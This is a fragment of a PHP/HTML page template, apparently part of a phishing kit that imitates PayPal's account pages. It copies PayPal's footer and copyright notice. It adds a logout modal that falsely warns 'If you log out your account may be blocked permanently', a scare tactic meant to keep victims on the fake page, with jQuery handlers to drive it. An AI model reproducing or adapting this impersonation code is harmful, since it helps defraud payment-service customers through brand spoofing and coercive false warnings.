<div class="noPrint nemo_footer vx_globalFooter-container">
<div class="vx_globalFooter">
<div class="vx_globalFooter-content">
<ul class="vx_globalFooter-list">
<li>
<a href="#" lass="nemo_helpLink"><?=$api->transcode("Help & Contact");?></a>
</li>
<li>
<a href="#" class="nemo_securityLink"><?=$api->transcode("Security");?></a>
</li>
</ul>
<div class="vx_globalFooter_secondary">
<p class="vx_globalFooter-copyright nemo_copyrightText">
<?=$api->encode("©");?><span> <?=$api->encode(date('Y'));?></span>
<?=$api->transcode("PayPal, Inc. All rights reserved.");?>
</p>
<ul class="vx_globalFooter-list_secondary">
<li>
<a href="#" class="nemo_privacyLink"><?=$api->transcode("Privacy");?></a>
</li>
<li>
<a href="#" class="nemo_legalLink"><?=$api->transcode("Legal");?></a>
</li>
<li>
<a href="#" class="nemo_policyUpdatesLink"><?=$api->transcode("Policy updates"); ?></a>
</li>
<li>
<a href="#" class="beta feedback nemo_feedback hidden-phone"><?=$api->transcode("Feedback");?></a>
</li>
</ul>
</div>
</div>
</div>
</div>
</div>

<div tabindex="-1" id="myModal" style="overflow: hidden;position: fixed;top: 0;right: 0;bottom: 0;left: 0; z-index: 1040; -webkit-overflow-scrolling: touch; outline: 0;display: none;">
<div style="background-color:#000000;position: fixed;top: 0; right: 0; bottom: 0;left: 0; z-index: 1040;opacity: 0.5;filter: alpha(opacity=50);height: 792px;"></div>
<div style="width: auto;margin: 10px;z-index: 100000;"></div>
<div style="z-index: 100011; width: auto; margin: auto; padding: 6px; position: relative; background-color: #ffffff; border: 1px solid #999999; border: 1px solid rgba(0,0,0,0.2); border-radius: 6px; -webkit-box-shadow: 0 3px 3px rgba(0,0,0,0.5); box-shadow: 0 4px 8px 0 rgba(0,0,0,0.2),0 6px 20px 0 rgba(0,0,0,0.19); -webkit-background-clip: padding-box; background-clip: padding-box; outline: 0; border-color: #e5e5e5 #d9d9d9 #cccccc; -webkit-box-shadow: 0 3px 3px rgba(148, 148, 148, 0.8); box-shadow: 0 0px 0px rgba(148, 148, 148, 0.8); -webkit-border-radius: 10px; -moz-border-radius: 6px; border-radius: 6px; -moz-background-clip: padding-box; -webkit-background-clip: padding-box; background-clip: padding-box; background-color:#fdfdfd; outline: 0 none; margin-top: 150px; max-width:1024px; min-width:auto; max-height:200px; opacity: 1;">
<center>
<div>
<h2><?=$api->transcode("If you log out your account may be blocked permanently");?></h2>
</div>
<a class="vx_btn" href="../logout"><?=$api->transcode("Yes");?></a>
<a class="vx_btn" id="close"><?=$api->transcode("No");?></a>
</center>
</div>
</div>
<script>
$(document).ready(function() {
  $('#logout1').click(function() {
    $('#myModal').fadeIn("slow");
  });
  $('#logout2').click(function() {
    $('#myModal').fadeIn("slow");
  });
  $('#close').click(function() {
    $('#myModal').fadeOut("slow");
  });
});

$(".vx_globalNav-link_notifications").click(function() {
  $("#kuzuluy").addClass("vx_hasOpenSidepanel");
});
$(".vx_sidepanel-headerIcon_right").click(function(e) {
  e.preventDefault();
  $("#kuzuluy").removeClass("vx_hasOpenSidepanel");
});
$(".js_toggleMobileMenu").click(function() {
  $("#kuzuluy").toggleClass("vx_hasOpenNav");
});
</script>
</body>
</html>
